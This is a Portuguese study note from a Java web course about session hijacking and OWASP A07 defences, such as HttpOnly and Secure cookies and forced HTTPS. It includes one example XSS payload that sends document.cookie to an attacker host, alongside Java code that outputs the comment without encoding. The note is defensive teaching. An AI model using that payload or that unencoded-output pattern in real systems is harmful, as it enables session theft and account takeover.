---
tags: [segurança, java, ufcd10791, auth]
aliases: ["Autenticação e Sessões", "Session Hijacking UFCD"]
owasp: "A07:2021 — Identification & Auth Failures"
severidade: "Alta"
type: "ufcd-study"
related:
  - "[[Session Hijacking and Authentication]]"
  - "[[Secure Cookies and HTTPS (Session Defense)]]"
  - "[[Cross-Site Scripting (XSS)]]"
  - "[[Cross-Site Request Forgery (CSRF)]]"
  - "[[Brute Force Attacks and Account Lockout]]"
  - "[[Anti-CSRF Tokens]]"
  - "[[UFCD 10791 - Web Application Development in Java]]"
---

# Autenticação e Sessões

> [!info] OWASP
> [A07:2021 — Identification & Auth Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)

## Descrição

O **Sequestro de Sessão (Session Hijacking)** é um ataque no qual um ator malicioso rouba o identificador de sessão de um utilizador legítimo e o utiliza para se passar por esse utilizador. O ataque mais comum para roubar cookies de sessão é através de Cross-Site Scripting (XSS).

---

## ❌ Má Prática — Roubo de Cookies de Sessão via XSS

Se a aplicação for vulnerável a XSS, um atacante pode injetar um script que rouba o cookie de sessão da vítima e o envia para um servidor controlado pelo atacante.

```java
// Atacante injeta este 'comentário' numa página vulnerável a XSS:
String maliciousComment = "<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>";

// A aplicação vulnerável renderiza o comentário sem o codificar:
out.println("<p>" + maliciousComment + "</p>");
// O script é executado no browser da vítima, enviando o seu cookie.
```

---

## ✅ Boa Prática — Usar Cookies Seguros e Forçar HTTPS

Uma defesa robusta combina várias camadas: cookies com atributos `HttpOnly` e `Secure`, e comunicação obrigatória sobre HTTPS.

```xml
<!-- Em web.xml (Java EE) -->
<session-config>
    <cookie-config>
        <http-only>true</http-only>   <!-- sem acesso JS -->
        <secure>true</secure>          <!-- apenas HTTPS -->
    </cookie-config>
</session-config>

<!-- Forçar HTTPS em toda a aplicação -->
<security-constraint>
    <web-resource-collection>
        <web-resource-name>Toda a aplicação</web-resource-name>
        <url-pattern>/*</url-pattern>
    </web-resource-collection>
    <user-data-constraint>
        <transport-guarantee>CONFIDENTIAL</transport-guarantee>
    </user-data-constraint>
</security-constraint>
```

---

## Tópicos Relacionados

- [[Cross-Site Scripting (XSS)]] — vetor principal de roubo de sessão
- [[Cross-Site Request Forgery (CSRF)]] — explora sessões ativas
- [[Brute Force Attacks and Account Lockout]] — outro vetor de comprometer autenticação

## Ligações

- Conceito: [[Session Hijacking and Authentication]]
- Defesa detalhada: [[Secure Cookies and HTTPS (Session Defense)]]
- Defesa complementar: [[Anti-CSRF Tokens]]
- Relacionado: [[Cross-Site Scripting (XSS)]] · [[Brute Force Attacks and Account Lockout]]
- Mapa: [[OWASP_Top10]]
- Curso: [[UFCD 10791 - Web Application Development in Java]]
- Implementação: [[AppComponent]] · [[HOME]]
